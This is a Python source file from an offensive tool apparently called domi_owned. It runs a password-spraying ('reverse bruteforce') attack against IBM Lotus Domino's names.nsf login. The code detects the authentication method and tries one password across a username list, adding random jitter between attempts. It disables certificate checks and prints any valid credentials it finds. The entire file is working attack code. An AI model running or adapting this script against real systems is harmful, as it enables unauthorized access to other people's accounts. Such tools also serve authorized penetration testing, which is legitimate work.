# Copyright (c) 2015, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import random
import re
import requests
import time

from domi_owned import utility

requests.packages.urllib3.disable_warnings()

# Get authentication type for names.nsf
def get_auth_type(target, header, usernames, password):
	names_url = "{0}/names.nsf".format(target)
	request = requests.get(names_url, headers=header, timeout=3, allow_redirects=False, verify=False)
	# Check for landing page
	if request.status_code == 200:
		post_regex = re.search('((?i)method=\'post\'|method=\"post\"|method=post)', request.text)
		if post_regex:
			auth_type = 'post'
		else:
			auth_type = 'get'
	# No landing page, authentication uses get
	elif request.status_code == 401:
		auth_type = 'get'
	# Assume authentication uses get
	else:
		utility.print_warn('Could not access names.nsf!')
		auth_type = 'get'

	reverse_bruteforce(target, header, usernames, password, auth_type)

# Preform a reverse bruteforce against names.nsf
def reverse_bruteforce(target, header, usernames, password, auth):
	username_list = []
	valid_usernames = []

	# Import usernames from file
	username_file = open(usernames, 'r')
	for username in username_file:
		username_list.append(username.strip('\n'))
	username_file.close()

	# Start reverse bruteforce
	for username in username_list:
		# Add short jitter
		jitter = random.random()
		time.sleep(jitter)
		try:
			if auth == 'get':
				names_url = "{0}/names.nsf".format(target)
				request = requests.get(names_url, headers=header, auth=(username, password), timeout=3, allow_redirects=False, verify=False)
			else:
				names_url = "{0}/names.nsf?Login".format(target)
				data = {'Username':username,
					'Password':password,
					'RedirectTo':names_url
				}
				request = requests.post(names_url, headers=header, data=data, timeout=3, verify=False)

			# Handle 200 response
			if request.status_code == 200:
				notes_regex = re.search('((?i)name=\'NotesView\'|name=\"NotesView\"|name=NotesView)', request.text)
				if notes_regex:
					utility.print_good("Found valid account: {0}:{1}".format(username, password))
					valid_usernames.append(username)
				else:
					pass
			# Handle other responses
			else:
				pass
		except KeyboardInterrupt:
			break
		except Exception:
			continue

	# Print found usernames
	if len(valid_usernames) > 0:
		if len(valid_usernames) == 1:
			utility.print_status("Found {0} valid account...".format(len(valid_usernames)))
		else:
			utility.print_status("Found {0} valid accounts...".format(len(valid_usernames)))

		for valid_username in valid_usernames:
			utility.print_good("{0}:{1}".format(valid_username, password))
	else:
		utility.print_warn('No valid accounts found!')
